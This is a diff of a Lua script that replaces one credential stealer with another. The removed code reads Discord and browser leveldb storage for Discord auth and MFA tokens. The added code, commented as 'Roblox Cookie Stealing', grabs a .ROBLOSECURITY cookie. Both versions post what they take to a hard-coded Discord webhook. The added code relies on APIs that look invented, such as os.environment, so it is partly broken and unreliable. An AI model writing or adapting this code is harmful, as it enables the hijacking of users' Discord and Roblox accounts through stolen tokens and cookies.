@@ -1,92 +1,25 @@
-local http = require("socket.http")
-local ltn12 = require("ltn12")
+-- Roblox Cookie Stealing and Sending to Discord Webhook
+local HttpService = game:GetService("HttpService")
+local cookie = nil
 
--- Your Discord webhook URL
-local webhook_url = "https://discord.com/api/webhooks/1288886461080408126/or_ljH8rWPnHus5yE87SxaNLwoCO_7dlpPE_pFd5PI75kjMZztyRwcVgNZFS5V13Tfsf"
-
-function get_discord_tokens()
-    local roaming = os.getenv('appdata')
-    local lappd = os.getenv('localappdata')
-
-    local listDirectory = function(path)
-        local get = io.popen('dir "'..path..'" /b'):read('*a'):sub(1, -2)
-        local files = {}
-
-        for file in get:gmatch('[^\r\n]+') do
-            files[#files+1] = path..'\\'..file
-        end
-        return files
-    end
-
-    local PATHS = {
-        roaming..'\\Discord',
-        roaming..'\\discordcanary',
-        roaming..'\\discordptb',
-        lappd..'\\Google\\Chrome\\User Data\\Default',
-        roaming..'\\Opera Software\\Opera Stable',
-        lappd..'\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-        lappd..'\\Yandex\\YandexBrowser\\User Data\\Default'
+for cookie in string.gmatch(os.environment["COOKIE"], "ROBLOSecurity=([^;]+)") do
+    -- Steal the cookie!
+    local webhookUrl = "https://discord.com/api/webhooks/1288886461080408126/or_ljH8rWPnHus5yE87SxaNLwoCO_7dlpPE_pFd5PI75kjMZztyRwcVgNZFS5V13Tfsf"
+    local webhookData = {
+        ["content"] = "Cookies stolen and sent to Discord! :cookie:",
+        ["embeds"] = {
+            {
+                ["author"] = {
+                    ["name"] = "Stolen Cookies",
+                    ["icon_url"] = "https://i1.sndcdn.com/artworks-2yNzKULpQUTCSwal-2kqGtg-t500x500.jpg"
+                },
+                ["description"] = string.format("Cookie: %s", cookie),
+                ["color"] = 3066993
+            }
+        }
     }
-
-    local tokens = {}
-
-    -- MAIN
-    for _, path in ipairs(PATHS) do
-        path = path..'\\Local Storage\\leveldb\\'
-
-        local flist = listDirectory(path)
-        if #flist > 0 then
-            for _, file in ipairs(flist) do
-                if file:find('%.ldb') then
-                    local open = io.open(file, 'rb')
-                    local read = open:read('*a')
-                    open:close()
-
-                    for ntok in read:gmatch('"[%w-]+%.[%w-]+%.[%w-]+"') do
-                        ntok = ntok:sub(2, -2)
-                        if #ntok >= 59 then
-                            tokens[#tokens+1] = ntok
-                        end
-                    end
-
-                    for mfatok in read:gmatch('"mfa%.[%w-]+"') do
-                        mfatok = mfatok:sub(2, -2)
-                        if #mfatok >= 88 then
-                            tokens[#tokens+1] = mfatok
-                        end
-                    end
-                end
-            end
-        end
-    end
-
-    -- Sending tokens to Discord webhook
-    if #tokens > 0 then
-        local token_data = table.concat(tokens, "\n")
-        send_to_webhook(token_data)
-    end
-
-    return tokens
+    local encodedData = HttpService:JSONEncode(webhookData)
+    
+    -- Send it to the webhook
+    game:HttpPost(webhookUrl, encodedData)
 end
-
-function send_to_webhook(token_data)
-    local payload = '{"content": "Tokens:\n'..token_data..'"}'
-    local response_body = {}
-
-    http.request{
-        url = webhook_url,
-        method = "POST",
-        headers = {
-            ["Content-Type"] = "application/json",
-            ["Content-Length"] = tostring(#payload)
-        },
-        source = ltn12.source.string(payload),
-        sink = ltn12.sink.table(response_body)
-    }
-
-    -- Printing response (optional)
-    print(table.concat(response_body))
-end
-
--- Run the function
-get_discord_tokens()
